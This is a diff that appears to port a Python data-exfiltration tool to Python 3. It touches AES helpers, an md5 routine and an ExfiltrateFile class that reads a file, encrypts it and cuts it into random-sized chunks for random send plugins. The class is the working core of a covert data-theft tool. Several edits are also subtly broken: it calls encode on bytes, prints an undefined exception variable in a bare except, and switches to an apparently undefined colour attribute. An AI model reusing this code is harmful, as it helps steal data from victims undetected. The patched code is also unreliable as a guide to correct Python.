@@ -43,7 +43,7 @@ def display_message(message):
 
 
 def warning(message):
-    display_message("%s%s%s" % (bcolors.WARNING, message, bcolors.ENDC))
+    display_message("%s%s%s" % (bcolors.ERROR, message, bcolors.ENDC))
 
 
 def ok(message):
@@ -61,15 +61,15 @@ def aes_encrypt(message, key=KEY):
         iv = os.urandom(AES.block_size)
 
         # Derive AES key from passphrase
-        aes = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
+        aes = AES.new(hashlib.sha256(key.encode()).digest(), AES.MODE_CBC, iv)
 
         # Add PKCS5 padding
-        pad = lambda s: s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
+        pad = lambda s: s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size).encode()
 
         # Return data size, iv and encrypted message
-        return iv + aes.encrypt(pad(message))
+        return iv.encode() + aes.encrypt(pad(message))
     except Exception as e:
-        print(e)
+        print("function AES_ENCRYPT",e)
         return None
 
 def aes_decrypt(message, key=KEY):
@@ -87,6 +87,7 @@ def aes_decrypt(message, key=KEY):
 
         return unpad(message)
     except:
+        print("function AES_DECRYPT",e)
         return None
 
 # Do a md5sum of the file
@@ -94,7 +95,7 @@ def md5(fname):
     hash = hashlib.md5()
     with open(fname) as f:
         for chunk in iter(lambda: f.read(4096), ""):
-            hash.update(chunk.encode())
+            hash.update(bytes(chunk,'utf8'))
     return hash.hexdigest()
 
 
@@ -255,18 +256,18 @@ class ExfiltrateFile(threading.Thread):
         time.sleep(time_to_sleep)
 
         # sending the data
-        f = tempfile.SpooledTemporaryFile()
+        f = tempfile.SpooledTemporaryFile(mode='w+b')
         e = open(self.file_to_send, 'rb')
         data = e.read()
         if COMPRESSION:
             data = compress(data)
-        f.write(aes_encrypt(data.encode(), self.exfiltrate.KEY))
+        f.write(aes_encrypt(bytes(data), self.exfiltrate.KEY))
         f.seek(0)
         e.close()
 
         packet_index = 0
         while (True):
-            data_file = f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ)).encode('hex')
+            data_file = f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ))
             if not data_file:
                 break
             plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
